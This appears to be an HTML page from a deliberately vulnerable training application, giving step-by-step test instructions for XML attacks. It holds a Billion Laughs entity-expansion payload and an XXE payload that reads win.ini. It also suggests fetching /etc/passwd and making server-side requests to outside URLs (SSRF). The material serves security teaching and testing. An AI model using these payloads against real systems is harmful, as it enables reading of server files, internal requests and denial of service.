<br><br>

<div class="tab">
	<button class="tablinks" onclick="displayInstruction(event, 'case1')">Billion Laughs Attack</button>
	<button class="tablinks" onclick="displayInstruction(event, 'case2')">External Entity Injection
		</button>
</div>


<div id="case1" class="tabcontent">
<h4>How to test?</h4>

1. Provide the following input and observe the output.<br>
<textarea rows="12" cols="60" style="border:none;">
<employees>
    <employee id="111">
        <firstName>Lokesh</firstName>
        <lastName>Gupta</lastName>
        <location>India</location>
    </employee>
    <employee id="333">
        <firstName>David</firstName>
        <lastName>Feezor</lastName>
        <location>USA</location>
    </employee>
</employees>	
</textarea>
<br><br>

2. Provide a malformed XML and observe the error. <br><br>

3. Provide the following input for "Billion Laughs attack". Observe the entity "t3" appended with USA at the end.<br>
<textarea rows="18" cols="60" style="border:none;">
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE employees
[
  <!ENTITY test "Billion Laughs! ">
  <!ENTITY t1 "&test;&test;">
  <!ENTITY t2 "&t1;&t1;&t1;&t1;">
  <!ENTITY t3 "&t2;&t2;&t2;&t2;&t2;">
]>
<employees>
    <employee id="111">
        <firstName>Lokesh</firstName>
        <lastName>Gupta</lastName>
        <location>India</location>
    </employee>
    <employee id="333">
        <firstName>David</firstName>
        <lastName>Feezor</lastName>
        <location>USA: &t3;</location>
    </employee>
</employees>
</textarea>
</div>




<div id="case2" class="tabcontent">
<h4>How to test?</h4>
 
<ol>
	<li>Provide the following input. Observe the external entity "file:///C:/Windows/win.ini" appended with USA at the end.</li>
 	<li>If the backend is Linux try to get the contents of /etc/passwd.</li>
 	<li>You can also make the application send HTTP requests (SSRF attack)  by using &lt;!ENTITY file SYSTEM "http://dummy.restapiexample.com/api/v1/employees"><br>
 	 If the response breaks the XML structure you will get an error. For this try https://google.com.</li>
</ol>

<textarea rows="16" cols="60" style="border:none;">
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE employees
[
  <!ENTITY file SYSTEM "file:///C:/Windows/win.ini">
]>
<employees>
    <employee id="111">
        <firstName>Lokesh</firstName>
        <lastName>Gupta</lastName>
        <location>India</location>
    </employee>
    <employee id="333">
        <firstName>David</firstName>
        <lastName>Feezor</lastName>
        <location>USA: &file;</location>
    </employee>
</employees>
</textarea>
</div>


 <script>
	function displayInstruction(evt, testCase) {
		var i, tabcontent, tablinks;
		tabcontent = document.getElementsByClassName("tabcontent");
		for (i = 0; i < tabcontent.length; i++) {
			tabcontent[i].style.display = "none";
		}
		tablinks = document.getElementsByClassName("tablinks");
		for (i = 0; i < tablinks.length; i++) {
			tablinks[i].className = tablinks[i].className
					.replace(" active", "");
		}
		document.getElementById(testCase).style.display = "block";
		evt.currentTarget.className += " active";
	}
</script>
 